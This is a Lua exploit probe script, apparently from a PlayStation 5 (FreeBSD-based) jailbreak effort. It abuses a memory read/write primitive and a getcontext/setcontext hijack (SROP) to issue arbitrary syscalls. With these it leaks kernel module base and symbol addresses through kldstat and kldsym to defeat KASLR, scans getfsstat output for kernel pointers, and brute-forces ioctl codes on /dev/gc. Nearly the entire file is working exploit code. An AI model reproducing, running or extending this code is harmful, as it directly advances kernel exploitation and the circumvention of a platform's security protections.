-- CRASH_CLASS: LOW
-- PROBE 138e: kldstat(308) and getfsstat(18) via SROP for kernel pointer leaks
--
-- kldstat returns kernel module load addresses on standard FreeBSD.
-- If Sony didn't block it, this defeats KASLR in one call.
-- getfsstat returns filesystem mount info that may contain kernel pointers.

print("=== PROBE 138e: KLDSTAT + FSSTAT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- A: kldstat(308)
-- int kldstat(int fileid, struct kld_file_stat *stat)
-- struct kld_file_stat {
--   int version;          // +0x00, must be sizeof(struct)
--   char name[MAXPATHLEN]; // +0x04, 1024 bytes
--   int refs;             // +0x404
--   int id;               // +0x408
--   caddr_t address;      // +0x410 (8 bytes on amd64) <-- KERNEL ADDR!
--   size_t size;          // +0x418
-- }
-- Total struct size on amd64 FreeBSD 11 = 0x420 (1056 bytes)
--------------------------------------------------------------------
print("")
print("--- [A] kldstat ---")

local kld_buf = gpu + 0x100

-- Try multiple struct sizes: older FreeBSD used smaller struct
local versions = {0x420, 0x150, 0x120, 0x108, 0x230}
for _, ver in ipairs(versions) do
    zero(kld_buf, 0x500)
    memory.write_dword(kld_buf, ver)
    local rv = srop(308, uint64(1), ua(kld_buf))
    local rvh, rvl = get_hi_lo(rv)
    print(string.format("[A] kldstat(1, ver=0x%X)=%s", ver, hex(rv)))
    if rvl == 0 and rvh == 0 then
        print("[A] *** KLDSTAT RETURNED SUCCESS! ***")
        -- Dump key fields
        local version_val = to_num(memory.read_dword(kld_buf))
        print("[A] version=" .. version_val)
        -- Name field
        local name = ""
        for i = 4, math.min(ver, 1028) do
            local b = to_num(memory.read_byte(kld_buf + i))
            if b == 0 then break end
            if b >= 32 and b < 127 then name = name .. string.char(b) end
        end
        print("[A] name: " .. name)

        -- For ver=0x420: address at +0x410
        if ver == 0x420 then
            local kaddr = safe_rq(kld_buf + 0x410)
            if kaddr then
                print("[A] address: " .. hex(kaddr))
                local kah, kal = get_hi_lo(kaddr)
                if kah >= 0xFFFF8000 and kah ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("[A] *** KERNEL MODULE BASE ADDRESS! KASLR DEFEATED! ***")
                end
            end
            local ksize = safe_rq(kld_buf + 0x418)
            if ksize then print("[A] size: " .. hex(ksize)) end
        end

        -- Dump all nonzero qwords for any version
        for off = 0, math.min(ver, 0x500) - 1, 8 do
            local v = safe_rq(kld_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[A] *** KPTR kld+0x%03X: %s ***", off, hex(v)))
                end
            end
        end
    end
end

-- Also try fileid 0..5 with the standard struct size
for fid = 0, 5 do
    zero(kld_buf, 0x500)
    memory.write_dword(kld_buf, 0x420)
    local rv = srop(308, uint64(fid), ua(kld_buf))
    print(string.format("[A] kldstat(%d)=%s", fid, hex(rv)))
    local rvh, rvl = get_hi_lo(rv)
    if rvl == 0 and rvh == 0 then
        local name = ""
        for i = 4, 260 do
            local b = to_num(memory.read_byte(kld_buf + i))
            if b == 0 then break end
            if b >= 32 and b < 127 then name = name .. string.char(b) end
        end
        print("[A] name: " .. name)
        local kaddr = safe_rq(kld_buf + 0x410)
        if kaddr then
            print("[A] address: " .. hex(kaddr))
            local kah, kal = get_hi_lo(kaddr)
            if kah >= 0xFFFF8000 and kah ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("[A] *** KERNEL BASE! ***")
            end
        end
    end
end

-- kldsym(337) — int kldsym(int fileid, int cmd, struct kld_sym_lookup *data)
-- cmd=1 (KLDSYM_LOOKUP)
-- struct kld_sym_lookup { int version; char *symname; u_long symvalue; size_t symsize; }
print("")
print("[A2] kldsym ---")
local sym_buf = gpu + 0x600
local sym_name = gpu + 0x700
ws(sym_name, "printf")
zero(sym_buf, 0x30)
memory.write_dword(sym_buf, 0x20)          -- version
memory.write_qword(sym_buf + 0x08, ua(sym_name)) -- symname pointer
local rv_ks = srop(337, uint64(1), uint64(1), ua(sym_buf))
print("[A2] kldsym(1,'printf')=" .. hex(rv_ks))
local ksh, ksl = get_hi_lo(rv_ks)
if ksl == 0 and ksh == 0 then
    local symval = safe_rq(sym_buf + 0x10)
    if symval then
        print("[A2] symvalue=" .. hex(symval))
        local svh, svl = get_hi_lo(symval)
        if svh >= 0xFFFF8000 and svh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print("[A2] *** KERNEL SYMBOL ADDRESS! ***")
        end
    end
end
print("[A2] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: getfsstat(18)
--------------------------------------------------------------------
print("")
print("--- [B] getfsstat ---")

-- First call: get count (NULL buf, 0 size, MNT_NOWAIT=2)
local rv_cnt = srop(18, uint64(0), uint64(0), uint64(2))
local cntH, cntL = get_hi_lo(rv_cnt)
print("[B] count=" .. hex(rv_cnt))

if cntL > 0 and cntL < 100 and cntH == 0 then
    -- FreeBSD 11 struct statfs is ~0x230 bytes
    -- But PS5 might use different size
    local statfs_sz = 0x230
    local need = cntL * statfs_sz
    local fs_buf = gpu + 0x2000
    if need > 0x10000 then need = 0x10000 end
    zero(fs_buf, math.min(need, 0x8000))
    local rv_fs = srop(18, ua(fs_buf), uint64(need), uint64(2))
    local fsh, fsl = get_hi_lo(rv_fs)
    print("[B] getfsstat=" .. hex(rv_fs))

    if fsl > 0 and fsl <= cntL and fsh == 0 then
        print("[B] got " .. fsl .. " filesystems")
        for i = 0, math.min(fsl, 8) - 1 do
            local base = fs_buf + (i * statfs_sz)
            -- f_fstypename at +0x00 (16 bytes)
            local fstype = ""
            for j = 0, 15 do
                local b = to_num(memory.read_byte(base + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then fstype = fstype .. string.char(b) end
            end
            -- f_mntonname at +0x58 (1024 bytes)
            local mnt = ""
            for j = 0, 79 do
                local b = to_num(memory.read_byte(base + 0x58 + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then mnt = mnt .. string.char(b) end
            end
            -- f_mntfromname at +0x458 (1024 bytes, might be at different offset)
            local from = ""
            for j = 0, 79 do
                local b = to_num(memory.read_byte(base + 0x458 + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then from = from .. string.char(b) end
            end
            print(string.format("[B] fs%d: type=%s mount=%s from=%s", i, fstype, mnt, from))

            -- Scan for kernel pointers in the full struct
            for off = 0, statfs_sz - 1, 8 do
                local v = safe_rq(base + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[B] *** KPTR fs%d+0x%03X: %s ***", i, off, hex(v)))
                    end
                end
            end
        end
    end
else
    print("[B] getfsstat count failed or zero")
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: gc ioctl
--------------------------------------------------------------------
print("")
print("--- [C] gc ioctl ---")
ws(gpu + 0x100, "/dev/gc")
local gc_fd = srop(5, ua(gpu + 0x100), uint64(2))
local gch, gcl = get_hi_lo(gc_fd)
if gcl > 0 and gcl < 256 and gch == 0 then
    print("[C] gc fd=" .. gcl)
    local io_buf = gpu + 0xE000
    local hits = 0
    local grps = {0x47, 0x67, 0x44, 0x64, 0x53, 0x73}
    for _, grp in ipairs(grps) do
        for cmd = 0, 7 do
            for _, sz in ipairs({4, 8, 16, 32}) do
                zero(io_buf, 0x100)
                local code = 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd
                local rv = srop(54, uint64(gcl), uint64(code), ua(io_buf))
                local ivh, ivl = get_hi_lo(rv)
                if ivl == 0 and ivh == 0 then
                    hits = hits + 1
                    print(string.format("[C] *** gc ioctl 0x%08X WORKS!", code))
                    for off = 0, math.min(sz, 32) - 1, 8 do
                        local v = safe_rq(io_buf + off)
                        if v then
                            local vh, vl = get_hi_lo(v)
                            if vh > 0 or vl > 0 then
                                print(string.format("  +0x%02X: %s", off, hex(v)))
                            end
                            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                                kfound = kfound + 1
                                print("  *** KERNEL POINTER! ***")
                            end
                        end
                    end
                end
            end
        end
    end
    print("[C] gc hits=" .. hits)
    srop(6, uint64(gcl))
else
    print("[C] gc OPEN FAIL = " .. hex(gc_fd))
end
print("[C] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
